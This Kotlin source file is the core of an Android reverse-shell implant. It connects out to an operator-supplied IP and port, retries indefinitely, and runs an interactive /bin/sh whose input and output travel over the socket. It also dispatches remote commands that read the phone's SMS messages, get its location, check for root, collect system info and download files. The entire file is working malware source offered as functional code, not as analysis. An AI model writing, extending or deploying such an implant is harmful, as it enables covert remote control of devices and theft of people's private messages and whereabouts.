package com.satwik.nexgenius.core.reverse_shell

import android.content.Context
import kotlinx.coroutines.Deferred
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket

/**
 * Establishes a reverse TCP connection to a remote server and handles shell interaction.
 *
 * This function attempts to establish a reverse TCP connection to the specified IP address and port.
 * It uses a MutableStateFlow to track the connection status and retries the connection if it fails.
 * Once connected, it initiates the shell interaction process.
 *
 * @param ip The IP address of the remote server.
 * @param port The port number to connect to.
 * @param retryInterval The time interval in milliseconds to wait before retrying a failed connection.
 * @param context The application context, used for accessing resources or system services if needed.
 */
suspend fun establishReverseTcp(ip: String, port: Int,retryInterval:Long, context: Context){

    val isSocketConnected = MutableStateFlow(false)

    withContext(Dispatchers.IO) {
        isSocketConnected.collect{ isConnected->
            launch {
                if(!isConnected){
                    try{
                        val socket = establishSocketConnection(ip, port, retryInterval)
                        isSocketConnected.value = true
                        handleShellInteraction(socket, context)
                    }
                    catch (e:IOException){
                        isSocketConnected.value = false
                        println(e.message)
                    }
                }
            }
        }
    }
}


/**
 * Handles the interaction with a remote shell through the provided socket.
 *
 * This function establishes a connection to a remote shell and continuously reads input from both the shell
 * and the socket. It forwards shell output to the socket and executes commands received from the socket
 * in the shell.
 *
 * @param socket The connected socket used for communication with the remote shell.
 * @param context The application context, used for accessing resources or system services if needed.
 */
private suspend fun handleShellInteraction(socket: Socket, context: Context)= withContext(Dispatchers.IO){

    val process = Runtime.getRuntime().exec(arrayOf("/bin/sh", "-i"))

    val shellInput = process.inputStream
    val shellError = process.errorStream
    val shellOutput = process.outputStream

    val socketInput = socket.getInputStream()
    val socketOutput = socket.getOutputStream()
    val socketReader = socketInput.bufferedReader()

    while (true) {
        while (shellInput.available() > 0) {
            socketOutput.write(shellInput.read())
        }

        while (shellError.available() > 0) {
            socketOutput.write(shellError.read())
        }

        while (socketInput.available() > 0) {
            val command = socketReader.readLine()
            executeCommand(command, socketOutput, socketInput, shellOutput, socket, process, context)
        }
        socketOutput.flush()
        shellOutput.flush()
    }
}


/**
 * Executes the given command in the remote shell.
 *
 * This function handles the execution of commands received from the socket. It delegates the execution
 * to the appropriate handler based on the command type.
 *
 * @param command The command to execute.
 * @param socketOutput The output stream of the socket, used to send responses back to the remote client.
 * @param socketInput The input stream of the socket, used for commands like "download" that require data transfer.
 * @param shellOutput The output stream of the shell process, used to send commands to the shell.
 * @param socket The connected socket used for communication with the remote shell.
 * @param process The shell process.
 * @param context The application context, used for accessing resources or system services if needed.
 */
private suspend fun executeCommand(
    command: String,
    socketOutput: OutputStream,
    socketInput: InputStream,
    shellOutput: OutputStream,
    socket: Socket,
    process: Process,
    context: Context
) {
    when (command) {
        "sysinfo" -> CommandHandler.handleSysInfo(socketOutput, shellOutput)
        "checkroot" -> CommandHandler.handleCheckRoot(socketOutput, shellOutput)
        "help" -> CommandHandler.handleHelp(socketOutput, shellOutput)
        "getsms" -> CommandHandler.handleGetSms(socketOutput, context, shellOutput)
        "exit" -> CommandHandler.handleExit(socket, process)
        "location"-> CommandHandler.handleCurrentLocation(context, socketOutput, shellOutput)
        else -> {
            if (command.startsWith("download")) {
                CommandHandler.handleDownload(command, socketOutput, socketInput)
            }
            else {
                CommandHandler.handleShellCommand(command, shellOutput, socketOutput)
            }
        }
    }
}



/**
 * Establishes a socket connection to the specified host and port.
 *
 * This function attempts to connect to the given host and port, retrying with the specified interval
 * if the connection fails. It continues to retry indefinitely until a successful connection is established.
 *
 * @param host The hostname or IP address of the server to connect to.
 * @param port The port number to connect to.
 * @param retryInterval The time interval in milliseconds to wait before retrying a failed connection.
 * @return A connected Socket object.
 */

private suspend fun establishSocketConnection(host: String, port: Int, retryInterval:Long): Socket {
    var socket: Socket? = null
    while (true) {
        try {
            if (socket?.isConnected != true) {
                println("Attempting to connect...")
                socket = Socket()
                withContext(Dispatchers.IO) {
                    socket.connect(InetSocketAddress(host, port), 2000)
                }
                if (socket.isConnected) {
                    println("Connected successfully!")
                    return socket
                }
            }
        } catch (e: Exception) {
            println("Failed to connect. Retrying in ${retryInterval/1000} seconds...")
        }
        delay(retryInterval)
    }
}












